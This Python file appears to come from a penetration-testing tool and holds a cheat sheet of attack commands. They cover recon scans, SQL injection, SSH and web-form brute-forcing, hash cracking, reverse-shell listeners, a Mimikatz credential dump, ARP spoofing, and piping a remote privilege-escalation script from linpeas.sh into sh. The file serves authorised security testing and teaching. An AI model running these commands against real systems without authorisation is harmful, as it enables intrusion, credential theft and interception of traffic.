"""
CyberXploit Pro - Penetration Testing Cheat Sheet
"""

from typing import Callable

CHEATSHEET = {
    "RECONNAISSANCE": [
        ("Nmap – Quick host scan",      "nmap -sn 192.168.1.0/24"),
        ("Nmap – Version + scripts",    "nmap -sCV -T4 <target>"),
        ("Nmap – Full port scan",       "nmap -p- -T4 <target>"),
        ("Nmap – UDP scan",             "sudo nmap -sU -T4 <target>"),
        ("theHarvester – Email recon",  "theHarvester -d <domain> -b google"),
        ("Shodan CLI",                  "shodan host <ip>"),
    ],
    "WEB APPLICATION": [
        ("Nikto – Web vulnerability",   "nikto -h <url>"),
        ("SQLMap – Auto SQLi",          "sqlmap -u '<url>?id=1' --dbs --batch"),
        ("Gobuster – Dir brute-force",  "gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt"),
        ("Feroxbuster – Recursive",     "feroxbuster -u <url> -w wordlist.txt"),
        ("WPScan – WordPress",          "wpscan --url <url> --enumerate vp,u"),
        ("FFUF – Fuzzing",              "ffuf -u <url>/FUZZ -w wordlist.txt"),
    ],
    "CREDENTIAL ATTACKS": [
        ("Hydra – SSH brute-force",     "hydra -L users.txt -P rockyou.txt <ip> ssh"),
        ("Hydra – HTTP-POST form",      "hydra -L users.txt -P pass.txt <ip> http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'"),
        ("Medusa – FTP brute-force",    "medusa -h <ip> -U users.txt -P rockyou.txt -M ftp"),
        ("CrackMapExec – SMB",          "crackmapexec smb <ip> -u users.txt -p pass.txt"),
        ("John – Hash cracking",        "john --wordlist=rockyou.txt hashes.txt"),
        ("Hashcat – GPU cracking",      "hashcat -m 0 hashes.txt rockyou.txt"),
    ],
    "POST-EXPLOITATION": [
        ("Netcat – Reverse shell",      "nc -lvnp 4444"),
        ("Socat – Stable shell",        "socat TCP-L:4444 FILE:`tty`,raw,echo=0"),
        ("Python – Pty shell upgrade",  "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"),
        ("LinPEAS – Linux privesc",     "curl -sL https://linpeas.sh | sh"),
        ("WinPEAS – Windows privesc",   "winpeas.exe"),
        ("Mimikatz – Credential dump",  "mimikatz # sekurlsa::logonpasswords"),
    ],
    "NETWORK ATTACKS": [
        ("Responder – LLMNR poison",    "sudo responder -I eth0 -rdwv"),
        ("Ettercap – MITM",             "ettercap -T -i eth0 -M arp:remote /<gw>// /<target>//"),
        ("Bettercap – Network recon",   "sudo bettercap -iface eth0"),
        ("ARP spoof",                   "arpspoof -i eth0 -t <victim> <gateway>"),
    ],
    "USEFUL RESOURCES": [
        ("HackTricks",                  "https://book.hacktricks.xyz"),
        ("GTFOBins",                    "https://gtfobins.github.io"),
        ("LOLBAS (Windows)",            "https://lolbas-project.github.io"),
        ("PayloadsAllTheThings",        "https://github.com/swisskyrepo/PayloadsAllTheThings"),
        ("RevShells generator",         "https://www.revshells.com"),
        ("CyberChef",                   "https://gchq.github.io/CyberChef"),
    ],
}


class Cheatsheet:

    def display(self, log_fn: Callable[[str, str], None] = print):
        for section, commands in CHEATSHEET.items():
            log_fn(f"\n  ── {section} {'─' * (45 - len(section))}", "header")
            for name, cmd in commands:
                log_fn(f"    {name:<40} {cmd}", "data")
        log_fn("", "data")
